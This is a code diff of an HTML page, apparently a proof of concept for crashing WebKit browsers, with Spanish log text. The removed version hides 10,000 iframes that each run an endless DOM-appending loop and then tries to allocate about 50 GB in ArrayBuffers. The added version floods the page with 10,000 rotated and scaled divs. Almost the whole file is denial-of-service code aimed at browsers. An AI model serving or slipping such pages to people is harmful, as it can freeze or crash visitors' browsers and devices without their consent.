@@ -1,60 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>WebKit Crash PoC</title>
+  <title>WebKit Crash Attempt (DOM Focused)</title>
   <style>
-    body {
-      background: #111;
-      color: #0f0;
-      font-family: monospace;
-    }
+    body { background: black; color: lime; font-family: monospace; }
+    .bomb { width: 50px; height: 50px; background: red; position: absolute; }
   </style>
 </head>
 <body>
-  <h1>Ejecutando PoC agresivo WebKit...</h1>
-  <pre id="log">Inicializando...</pre>
+  <h1>Test: DOM Flooding sin ArrayBuffer</h1>
+  <pre id="log">Iniciando...</pre>
 
   <script>
-    const log = msg => document.getElementById("log").textContent += "\n" + msg;
+    const log = txt => document.getElementById("log").textContent += "\n" + txt;
 
-    try {
-      log("Iniciando test de corrupción de capa de renderizado...");
+    let container = document.createElement("div");
+    document.body.appendChild(container);
 
-      for (let i = 0; i < 10000; i++) {
-        const iframe = document.createElement("iframe");
-        iframe.srcdoc = `<script>while(1)document.body.appendChild(document.createElement('div'))<\/script>`;
-        iframe.style.position = "absolute";
-        iframe.style.top = "-9999px";
-        document.body.appendChild(iframe);
-        if (i % 100 === 0) log("Iteración " + i);
+    let count = 0;
+    let interval = setInterval(() => {
+      for (let i = 0; i < 100; i++) {
+        let el = document.createElement("div");
+        el.className = "bomb";
+        el.style.left = `${Math.random() * window.innerWidth}px`;
+        el.style.top = `${Math.random() * window.innerHeight}px`;
+        el.style.transform = `rotate(${Math.random() * 360}deg) scale(${Math.random() * 5})`;
+        container.appendChild(el);
       }
 
-      log("Probando animaciones y transformaciones pesadas...");
+      count += 100;
+      log(`Creados ${count} elementos`);
 
-      for (let i = 0; i < 10000; i++) {
-        let div = document.createElement("div");
-        div.style.width = div.style.height = "100px";
-        div.style.background = "#0f0";
-        div.style.position = "absolute";
-        div.style.top = `${Math.random() * 1000}px`;
-        div.style.left = `${Math.random() * 1000}px`;
-        div.style.transform = `scale(${Math.random() * 10}) rotate(${Math.random() * 360}deg)`;
-        div.style.transition = "all 0.1s linear";
-        document.body.appendChild(div);
+      if (count > 10000) {
+        log("Finalizando test.");
+        clearInterval(interval);
       }
-
-      log("Forzando liberación de memoria...");
-
-      let arr = [];
-      for (let i = 0; i < 50000; i++) {
-        arr.push(new ArrayBuffer(1024 * 1024)); // 1MB por entrada
-        if (i % 1000 === 0) log("Buffering " + i + "MB");
-      }
-
-      log("Test completado. Si no se colgó, el navegador es resistente.");
-    } catch (e) {
-      log("Excepción: " + e.toString());
-    }
+    }, 100);
   </script>
 </body>
 </html>
